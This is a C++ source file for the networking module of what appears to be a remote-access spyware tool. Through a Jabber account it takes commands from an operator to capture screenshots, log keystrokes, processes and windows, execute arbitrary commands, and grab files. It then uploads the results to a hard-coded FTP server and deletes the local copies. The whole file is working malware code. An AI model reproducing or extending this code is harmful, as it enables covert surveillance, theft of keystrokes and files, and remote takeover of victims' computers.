
#include "network.h"
#include "utils.h"

namespace network
{
	#define ftp_server L"ftpserver.com"
	#define ftp_user L"ftpuser"
	#define ftp_password L"ftppassword"
	#define email "mail@host.com"
	#define emal_password "mailpassword"

	network_t::network_t() : connected(false)
	{
		spy = JID("spyhost@jabber.ru");
		terminal = JID("ownerhost@jabber.ru");
		password = "jabberpassword";
	}

	network_t::~network_t()
	{
		if (session) client->disposeMessageSession(session);

		delete client;
	}

	void network_t::start()
	{
		client = new Client(spy, password);

		client->registerConnectionListener(this);
		client->registerMessageSessionHandler(this, 0);
		client->registerPresenceHandler(this);

		try_connect(milliseconds(0));
	}

	void network_t::try_connect(milliseconds delay)
	{
		boost::thread receive(boost::bind(&network_t::receive_loop, this, delay));
		receive.detach();
	}

	void network_t::receive_loop(milliseconds delay)
	{
		if (delay.count() > 0)
			boost::this_thread::sleep_for(delay);

		if (connected = client->connect(false))
		{
			ConnectionError ce = ConnNoError;

			while (ce == ConnNoError)
			{
				ce = client->recv(200 * 1000 * 1000);
			}

			connected = false;
		}
	}

	bool network_t::online() const
	{
		return connected;
	}

	void network_t::ping()
	{
		client->send(Presence(Presence::PresenceType::Available, terminal));
	}

	void network_t::send_files(bool delete_after)
	{
		int attempt = 0;

		while (files_queue.size() && attempt < 10)
		{
			path file = files_queue.front();
			bool success = send_file(file);

			if (success)
			{
				files_queue.pop();

				if (delete_after && exists(file))
				{
					remove(file);
				}
			}
			else
			{
				attempt++;
				boost::this_thread::sleep_for(milliseconds(500));
			}
		}
	}

	void network_t::onConnect()
	{
		connected = true;
	}

	void network_t::onDisconnect(ConnectionError e)
	{
		connected = false;

		try_connect(milliseconds(500));
	}

	bool network_t::onTLSConnect(const CertInfo & info)
	{
		connected = true;

		return true;
	}

	void network_t::handleMessage(const Message & msg, MessageSession * session)
	{
		wchar_t buf[10000];
		mbstowcs(buf, msg.body().c_str(), sizeof(buf));
		parse_cmd(buf);

		ping();
	}

	void network_t::handleMessageSession(MessageSession * session)
	{
		if (this->session)
			client->disposeMessageSession(this->session);

		this->session = session;
		this->session->registerMessageHandler(this);
	}

	void network_t::handlePresence(const Presence & presence)
	{

	}

	void network_t::parse_cmd(const wstring & cmd)
	{
		vector<wstring> commands = separate_cmd(cmd);

		if (commands.size() == 0)
			return;
		else if (commands.size() == 1)
			simple_cmd(commands[0]);
		else
			complex_cmd(commands);
	}

	void network_t::simple_cmd(const wstring & cmd)
	{
		int code = _wtoi(cmd.c_str());

		if (code == PING)
		{
			ping();
		}
		else if (code == SCREENSHOT)
		{
			path file = utils::screen_unique_path();
			make_screenshot(file);

			files_queue.push(file);
			send_files(true);
		}
		else if (code == LOG_KEYS)
		{
			path file = utils::log_unique_path();
			log_keys(file);

			files_queue.push(file);
			send_files(true);
		}
		else if (code == LOG_DIRECTORIES)
		{
			log_directories();
		}
		else if (code == LOG_PROCESSES)
		{
			path file = utils::log_unique_path();
			log_processes(file);

			files_queue.push(file);
			send_files(true);
		}
		else if (code == LOG_WINDOWS)
		{
			path file = utils::log_unique_path();
			log_windows(file);

			files_queue.push(file);
			send_files(true);
		}
		else if (code == RESET_TRACKING)
		{
			reset_tracking();
		}
		else if (code == DOWNLOAD_ALL)
		{
			prepare_files(vector<wstring>());
			send_files(true);
		}
	}

	void network_t::complex_cmd(const vector<wstring> & cmds)
	{
		int code = _wtoi(cmds[0].c_str());

		vector<wstring> args(cmds.size() - 1);
		copy(cmds.begin() + 1, cmds.end(), args.begin());

		if (!args.size())
		{
			return;
		}

		if (code == LOG_FILES)
		{
			log_files(args);
		}
		else if (code == EXECUTE)
		{
			exec_line(args);
		}
		else if (code == MESSAGE_BOX)
		{
			message_box(args);
		}
		else if (code == TRACK_PROCESSES)
		{
			track_processes(args[0]);
		}
		else if (code == TRACK_WINDOWS)
		{
			track_windows(args[0]);
		}
		else if (code == GRAB_FILES)
		{
			for (wstring arg : args)
			{
				path file(arg);

				if (exists(file) && is_regular_file(file))
				{
					files_queue.push(file);
				}
			}

			send_files(false);
		}
	}

	vector<wstring> network_t::separate_cmd(const wstring & cmd) const
	{
		vector<wstring> commands;

		boost::char_separator<wchar_t> sep(L";");
		boost::tokenizer<boost::char_separator<wchar_t>, wstring::const_iterator, wstring> token(cmd, sep);

		for (auto it = token.begin(); it != token.end(); ++it)
		{
			commands.push_back(*it);
		}

		return commands;
	}

	void network_t::prepare_files(const vector<wstring> & files)
	{
		if (files.size())
		{
			for (auto file : files)
			{
				path file_path(file);

				if (exists(file_path) && is_regular_file(file_path))
				{
					files_queue.push(path(file));
				}
			}

			return;
		}

		directory_iterator it(current_path().generic_wstring());

		while (it != directory_iterator())
		{
			const path & file = *it;

			if ((file.extension().generic_wstring() == L".jpg" && is_regular_file(file))
				|| (file.extension().generic_wstring() == L".log" && is_regular_file(file)))
			{
				files_queue.push(file);
			}

			++it;
		}
	}

	bool network_t::send_file(const path & file)
	{
		HINTERNET inet, session;
		inet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

		if (inet)
		{
			session = InternetConnect(inet, ftp_server, INTERNET_DEFAULT_FTP_PORT,
				ftp_user, ftp_password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);

			if (!session)
			{
				InternetCloseHandle(inet);
				return false;
			}

			bool result = !!FtpPutFile(session, file.generic_wstring().c_str(),
				file.filename().generic_wstring().c_str(), FTP_TRANSFER_TYPE_BINARY, 0);

			InternetCloseHandle(session);
			InternetCloseHandle(inet);

			return result;
		}

		return false;
	}
}